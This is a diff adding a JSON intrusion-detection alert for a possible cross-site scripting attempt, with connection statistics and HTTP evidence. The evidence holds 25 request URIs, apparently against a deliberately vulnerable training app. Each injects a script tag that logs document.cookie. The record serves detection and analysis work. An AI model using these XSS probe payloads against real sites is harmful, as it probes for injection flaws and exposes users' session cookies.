@@ -1,0 +1,264 @@
+{
+  "alert": {
+    "signature": "ET WEB_SERVER Script tag in URI Possible Cross Site Scripting Attempt",
+    "category": "Web Application Attack",
+    "timestamp": "2025-07-02T02:23:53.932Z"
+  },
+  "connection": {
+    "identity": {
+      "source_ip": "172.16.0.1",
+      "source_port": "56306",
+      "destination_ip": "192.168.10.50",
+      "destination_port": "80",
+      "traffic_direction": "Lateral",
+      "service": "http",
+      "transport_protocol": "tcp"
+    },
+    "statistics": {
+      "duration_sec": 0.9524,
+      "sent_bytes": 48783,
+      "received_bytes": 183606
+    },
+    "analysis": {
+      "connection_state": "Normal Connection (SF)",
+      "history_analysis": {
+        "label": "Unrecognized Pattern",
+        "summary": "Requires manual review: 'ShADagdgGfF'.",
+        "severity": "Informational"
+      },
+      "flow_analysis": {
+        "direction": "Symmetrical"
+      }
+    }
+  },
+  "evidence": {
+    "high": {
+      "http": {
+        "analysis": {
+          "user_agent_category": "Normal Browser",
+          "destination_analysis": "Direct-to-IP Connection",
+          "transfer_volume": "Normal",
+          "content_risk": "Suspicious Content Detected",
+          "file_transfer_risk": "No File Transfer"
+        },
+        "evidence": {
+          "connection_context": {
+            "methods_used": [
+              "GET"
+            ],
+            "user_agent_string": "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0",
+            "destination_ip": "205.174.165.68"
+          },
+          "findings": [
+            {
+              "type": "Content Finding",
+              "source": "uri",
+              "content": "/dv/vulnerabilities/xss_r/?name=<script>console.log('ZB1V3N4MN2UILTLUOQYGFN333KU1Y12NIJP7GPS7LEG70NQ22C');console.log(document.cookie);</script>",
+              "reasons": [
+                "Script Tag"
+              ]
+            },
+            {
+              "type": "Content Finding",
+              "source": "uri",
+              "content": "/dv/vulnerabilities/xss_r/?name=<script>console.log('BSGL7YI3VAFHM6W03OVQUSPINF95BX82MRP2FNU38BK5BDQKZR');console.log(document.cookie);</script>",
+              "reasons": [
+                "Script Tag"
+              ]
+            },
+            {
+              "type": "Content Finding",
+              "source": "uri",
+              "content": "/dv/vulnerabilities/xss_r/?name=<script>console.log('PGQND4GA87JMM2WFS6NT4BWVHHVAEU1M7STGXGWU98RUVT346F');console.log(document.cookie);</script>",
+              "reasons": [
+                "Script Tag"
+              ]
+            },
+            {
+              "type": "Content Finding",
+              "source": "uri",
+              "content": "/dv/vulnerabilities/xss_r/?name=<script>console.log('64MXSZK7510BPLWF0NRB5P5ZGFAJG9V710XD19FE1FROZDYSOD');console.log(document.cookie);</script>",
+              "reasons": [
+                "Script Tag"
+              ]
+            },
+            {
+              "type": "Content Finding",
+              "source": "uri",
+              "content": "/dv/vulnerabilities/xss_r/?name=<script>console.log('PKR2XPV2HHUMQFNBQIGHV1BIKDNXPZ8IDZE06VFKQOYZ6WPR19');console.log(document.cookie);</script>",
+              "reasons": [
+                "Script Tag"
+              ]
+            },
+            {
+              "type": "Content Finding",
+              "source": "uri",
+              "content": "/dv/vulnerabilities/xss_r/?name=<script>console.log('8X3GRU8W3H8F62ATAZCCTA3ZUX7AI706USG1RK24JBBX6JZ92E');console.log(document.cookie);</script>",
+              "reasons": [
+                "Script Tag"
+              ]
+            },
+            {
+              "type": "Content Finding",
+              "source": "uri",
+              "content": "/dv/vulnerabilities/xss_r/?name=<script>console.log('BBUO9MS18KDC6W55UOMGDATUP88KSN7EGPXGUO9S5K2BI27DMJ');console.log(document.cookie);</script>",
+              "reasons": [
+                "Script Tag"
+              ]
+            },
+            {
+              "type": "Content Finding",
+              "source": "uri",
+              "content": "/dv/vulnerabilities/xss_r/?name=<script>console.log('K4RG16NAAQWP08K74ZQG4HFP4D00UNH0SHS1HC3XP1G6KM5UNT');console.log(document.cookie);</script>",
+              "reasons": [
+                "Script Tag"
+              ]
+            },
+            {
+              "type": "Content Finding",
+              "source": "uri",
+              "content": "/dv/vulnerabilities/xss_r/?name=<script>console.log('SRBQS1OYV6EMN891VZYBKZ0IYQYZ5DSB0UL2HE1V7J5HG0XP8T');console.log(document.cookie);</script>",
+              "reasons": [
+                "Script Tag"
+              ]
+            },
+            {
+              "type": "Content Finding",
+              "source": "uri",
+              "content": "/dv/vulnerabilities/xss_r/?name=<script>console.log('NKMWKN15G5JL2EA9ULXQNFMFJ0BGZHHRSGBEGJ1U7DFHVL379F');console.log(document.cookie);</script>",
+              "reasons": [
+                "Script Tag"
+              ]
+            },
+            {
+              "type": "Content Finding",
+              "source": "uri",
+              "content": "/dv/vulnerabilities/xss_r/?name=<script>console.log('ER7X7RQEHZXZFUNXOM27BHL7WT7XDP96GNV7XTZMI93O80LGSK');console.log(document.cookie);</script>",
+              "reasons": [
+                "Script Tag"
+              ]
+            },
+            {
+              "type": "Content Finding",
+              "source": "uri",
+              "content": "/dv/vulnerabilities/xss_r/?name=<script>console.log('NP9PN59QYUXFPNJT2WWG5P80SGIRJG68QH8KOI3AH4GFTP5VWK');console.log(document.cookie);</script>",
+              "reasons": [
+                "Script Tag"
+              ]
+            },
+            {
+              "type": "Content Finding",
+              "source": "uri",
+              "content": "/dv/vulnerabilities/xss_r/?name=<script>console.log('H8SLLG2SJM77NCDEP1U3XYEY7NQPQ1EHFK824S6T2OKMS5RZ2V');console.log(document.cookie);</script>",
+              "reasons": [
+                "Script Tag"
+              ]
+            },
+            {
+              "type": "Content Finding",
+              "source": "uri",
+              "content": "/dv/vulnerabilities/xss_r/?name=<script>console.log('H71XJCFRHZZ89SMBQLZDIXKC51MSKUX6TUNI0JT8P0GEGNX5ZD');console.log(document.cookie);</script>",
+              "reasons": [
+                "Script Tag"
+              ]
+            },
+            {
+              "type": "Content Finding",
+              "source": "uri",
+              "content": "/dv/vulnerabilities/xss_r/?name=<script>console.log('77JVOCXQCCH7WD0VHBZNFZOD2I1AP8UEZ7KUM7U5CYJDMQDFOS');console.log(document.cookie);</script>",
+              "reasons": [
+                "Script Tag"
+              ]
+            },
+            {
+              "type": "Content Finding",
+              "source": "uri",
+              "content": "/dv/vulnerabilities/xss_r/?name=<script>console.log('Z5EVROSEXGUG4T8B6WIJ4OX7VOO9EMYVXALYVQNW29S5VFJNZ4');console.log(document.cookie);</script>",
+              "reasons": [
+                "Script Tag"
+              ]
+            },
+            {
+              "type": "Content Finding",
+              "source": "uri",
+              "content": "/dv/vulnerabilities/xss_r/?name=<script>console.log('89VKGRD3IHAI2X7NKLKVAQBWYRDJR96ARKSVZB8HXT7TDC97VM');console.log(document.cookie);</script>",
+              "reasons": [
+                "Script Tag"
+              ]
+            },
+            {
+              "type": "Content Finding",
+              "source": "uri",
+              "content": "/dv/vulnerabilities/xss_r/?name=<script>console.log('P4RVDYYZFCJII9YABSO7XUVZIZ7S52TQO3491K6UWF1YIUFWNT');console.log(document.cookie);</script>",
+              "reasons": [
+                "Script Tag"
+              ]
+            },
+            {
+              "type": "Content Finding",
+              "source": "uri",
+              "content": "/dv/vulnerabilities/xss_r/?name=<script>console.log('SZRG2YLLTPZIBJUGTL3ZZQOGEJUVI2W5VJ5KU50CSW9WT0DEBY');console.log(document.cookie);</script>",
+              "reasons": [
+                "Script Tag"
+              ]
+            },
+            {
+              "type": "Content Finding",
+              "source": "uri",
+              "content": "/dv/vulnerabilities/xss_r/?name=<script>console.log('WDXH3OFKUNE9SH8FW6GGRD6ZZYUSZOZ8OOW35BGYGNMVKEWZK2');console.log(document.cookie);</script>",
+              "reasons": [
+                "Script Tag"
+              ]
+            },
+            {
+              "type": "Content Finding",
+              "source": "uri",
+              "content": "/dv/vulnerabilities/xss_r/?name=<script>console.log('SV5BAJ98C9KU8O0RAUA2FA4D98IYKDX7QIZLF4CLLF1KEOMVNX');console.log(document.cookie);</script>",
+              "reasons": [
+                "Script Tag"
+              ]
+            },
+            {
+              "type": "Content Finding",
+              "source": "uri",
+              "content": "/dv/vulnerabilities/xss_r/?name=<script>console.log('EPD8UJ0R3NK6U1XNZN2MFB1ZCTMBW8O59VEH6B58LRKYK1M8CX');console.log(document.cookie);</script>",
+              "reasons": [
+                "Script Tag"
+              ]
+            },
+            {
+              "type": "Content Finding",
+              "source": "uri",
+              "content": "/dv/vulnerabilities/xss_r/?name=<script>console.log('6AUTIZ4JM3SW1B7B1481HSXBYX2FQPN5L2561U8KQB8155GCQN');console.log(document.cookie);</script>",
+              "reasons": [
+                "Script Tag"
+              ]
+            },
+            {
+              "type": "Content Finding",
+              "source": "uri",
+              "content": "/dv/vulnerabilities/xss_r/?name=<script>console.log('Z5MPL8A2YLTQMEYS9ULOZ4B3QTT6FIH6O8VYW702MT4QUL8B42');console.log(document.cookie);</script>",
+              "reasons": [
+                "Script Tag"
+              ]
+            },
+            {
+              "type": "Content Finding",
+              "source": "uri",
+              "content": "/dv/vulnerabilities/xss_r/?name=<script>console.log('26N9N84KR5XCA6N7Z82895NHIO2IESWLM28XKQ5YNORKLDE9SQ');console.log(document.cookie);</script>",
+              "reasons": [
+                "Script Tag"
+              ]
+            }
+          ]
+        },
+        "statistics": {
+          "total_requests": 50,
+          "request_bytes": 0,
+          "response_bytes": 0,
+          "client_error_ratio": 0.0
+        }
+      }
+    }
+  }
+}
